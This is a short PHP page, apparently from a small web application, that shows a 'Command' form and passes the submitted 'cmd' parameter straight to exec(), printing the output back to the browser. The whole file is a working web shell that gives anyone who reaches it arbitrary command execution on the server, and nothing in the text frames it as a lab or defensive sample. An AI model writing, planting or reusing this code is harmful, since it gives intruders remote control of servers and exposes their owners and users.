<?php
require_once("../../utils.php");

$content .= "<form action='shell.php'>\n";
$content .= "<label for='command'>Command: </label>\n";
$content .= "<input type='text' id='cmd' name='cmd'>\n";
$content .= "<input type='submit' value='Submit'>\n";
$content .=  "</form>\n";

if (isset($_GET['cmd'])) {
	$res = null;
	exec($_GET['cmd'], $res);
	foreach ($res as $line) {
		$content .= $line . "<br>";
	}
}

displayContent($content);

?>
